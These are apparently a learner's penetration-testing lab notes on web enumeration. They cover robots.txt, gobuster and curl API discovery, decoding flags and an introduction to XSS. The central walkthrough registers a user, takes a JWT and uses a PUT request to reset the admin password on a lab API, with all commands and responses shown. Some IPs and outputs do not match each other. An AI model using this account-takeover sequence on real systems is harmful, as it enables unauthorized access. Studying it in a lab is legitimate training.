# Debugging Page Content

## Step 1: Map file extensions and programming language.
    - Inspect the page via the Firefox Debugging tool.
![alt text](image-12.png)

## Utilize the Inspect + Prettify tools
- Click the brackets at the bottom to "Prettify" it. Sometimes codes are condensed and this uncondenses it.
  
![alt text](image-14.png)

## Inspecting HTTP Response Headers and Sitemaps

![alt text](image-15.png)

## Robots.txt

```bash
curl https://www.google.com/robots.txt
#or
curl https://TARGET IP/robots.txt

# Make sure you change http and https
```

## Enumerating and Abusing APIs

- NOTE: APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application.
- API paths are often followed by a version number, resulting in a pattern such as: 
```
/api_name/v1
```
## Enumerate the API with gobuster and Curl
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt

#Results
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.137.16:5002
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# console              (Status: 200) [Size: 1985]
# ui                   (Status: 308) [Size: 267] [--> http://192.168.137.16:5002/ui/]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```
![alt text](image-17.png)

# Run a Curl command on the discovered UI page (DISCOVERED ADMIN CREDS)
```bash
curl -i http://192.168.137.16:5002/users/v1      

# Results
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 316
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Sat, 21 Feb 2026 22:49:30 GMT

{
  "users": [
    {
      "email": "mail1@mail.com", 
      "username": "name1"
    }, 
    {
      "email": "mail2@mail.com", 
      "username": "name2"
    }, 
    {
      "email": "admin@mail.com", 
      "username": "admin"
    }, 
    {
      "email": "pwn@offsec.com", 
      "username": "offsec"
    }
  ]
}         
```
![alt text](image-18.png)

- 3 Users found, including username `admin'
- Verify further API property is related to the username property by inserting admin in username field.

```bash
gobuster dir -u http://192.168.137.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

# Results
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.137.16:5002/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
email                (Status: 405) [Size: 142]
password             (Status: 405) [Size: 142]
Progress: 959 / 959 (100.00%)
===============================================================
Finished
===============================================================
```
- Instead of a 404 Not Found response code, we received a 405 METHOD NOT ALLOWED, implying that the requested URL is present, but that our HTTP method is unsupported. By default, curl uses the GET method when it performs requests, so we could try interacting with the password API through a different method, such as POST or PUT.
- verify `admin`credentials are accepted. We can check if the login method is supported by extending our base URL:
```bash
curl -i http://192.168.50.16:5002/users/v1/login

#Results
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Sat, 21 Feb 2026 23:01:35 GMT

{ "status": "fail", "message": "User not found"}                                           

#NOTE: While it did fail, this implies that the page itself does exist. We only need to find a proper way to interact with it. 

# Attempt a real username and dummy password

curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.137.16:5002/users/v1/login

#Results

{ "status": "fail", "message": "Password is not correct for the given username."} 

#NOTE: The API return message shows that the authentication failed, meaning that the API parameters are correctly formed.

# Since we don't know admin's password, let's try another route and check whether we can register as a new user. This might lead to a different attack surface. 

┌──(kali㉿kali)-[~/oscp]
└─$ curl -d '{"password":"1234","username":"fakeadmin"}' -H 'Content-Type: application/json'  http://192.168.137.16:5002/users/v1/register

#Results

{ "status": "fail", "message": "'email' is a required property"}                                        

#NOTE: The API replied with a "fail" message stating that we should also include an email address. We should also see if we can include `admin' status.

curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

#Results

{"message": "Successfully registered. Login to receive an auth token.", "status": "success"} 

#NOTE: try to log

curl -d '{"password":"lab","username":"fakeadmin"}' -H 'Content-Type: application/json'  http://192.168.137.16:5002/users/v1/login

#Results

{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzE4NTYyNjAsImlhdCI6MTc3MTg1NTk2MCwic3ViIjoib2Zmc2VjIn0.TGqIJJ1mj5YQVmM6b1mE6emUxJcL4j_4pdTZ1QIlg6o", "message": "Successfully logged in.", "status": "success"} 

# NOTE: We were able to correctly sign in and retrieve a JSON Web Token (JWT) authentication token.

```

## Change admin password

```bash

curl  \
  'http://192.168.137.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzE3MTU3MDUsImlhdCI6MTc3MTcxNTQwNSwic3ViIjoiZmFrZWFkbWluIn0.TmmwnTIfkk2as99YbBMeJNbZqp_0IEZ3GpyuwEZINOE' \  
  -d '{"password": "pwned"}'

#Results

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}

#NOTE: HTTP method is unsupported, so we’ll try an alternative. The PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request

curl -X 'PUT' \ 
  'http://192.168.137.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzE3MTU3MDUsImlhdCI6MTc3MTcxNTQwNSwic3ViIjoiZmFrZWFkbWluIn0.TmmwnTIfkk2as99YbBMeJNbZqp_0IEZ3GpyuwEZINOE' \
  -d '{"password": "pwned"}'

#NOTE: No results, so we can assume or check the application backend processed the request without error. Try logging in as user admin.

curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.137.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzE4NTU4MzAsImlhdCI6MTc3MTg1NTUzMCwic3ViIjoiZmFrZWFkbWluIn0.uOCsFqV6_bOm_3XqdIIrgoPmBKw7BtsnUILBOnqkWbU", 

#Results

"message": "Successfully logged in.", "status": "success"} 

```

![alt text](image-19.png)

# Encoded text or URL

## Utilize tool hURL

```bash

#Found this interesting URL: curl http://192.168.217.52/                                                                                                                                                                                                                                                                                         
<meta http-equiv="refresh" content="0; URL=/?flag=%4f%53%7b%62%38%65%63%36%33%39%37%31%38%63%34%34%35%34%33%37%36%34%65%64%63%34%62%38%66%36%63%31%37%33%35%7d" />            

# Decode command

hURL -d %4f%53%7b%62%38%65%63%36%33%39%37%31%38%63%34%34%35%34%33%37%36%34%65%64%63%34%62%38%66%36%63%31%37%33%35%7d

Original      :: %4f%53%7b%62%38%65%63%36%33%39%37%31%38%63%34%34%35%34%33%37%36%34%65%64%63%34%62%38%66%36%63%31%37%33%35%7d
2xURL DEcoded :: OS{b8ec639718c44543764edc4b8f6c1735}
```
# Another form of decoding

- Found this text in the response field after sending a "HEAD" request: VGhlIGZsYWcgaXM6IE9TezhhNDQxYzNjYTIzZWQ2MGQ1OTRiZmYyMzhhMjQxOTNifQ==
![alt text](image-20.png)

- Put it in Burpsuites decoder tool

![alt text](image-21.png)

# Cross-Site Scripting (XSS)

### Two types: Stored (Persistant) and Reflected
- Stored: Normally stored XSS vulnerabilities often exist in forum software, especially in **comment sections**, in product reviews, or **wherever user content can be stored** and reviewed later.
- Reflected: Reflected XSS attacks usually include the **payload ** in a crafted request or link.

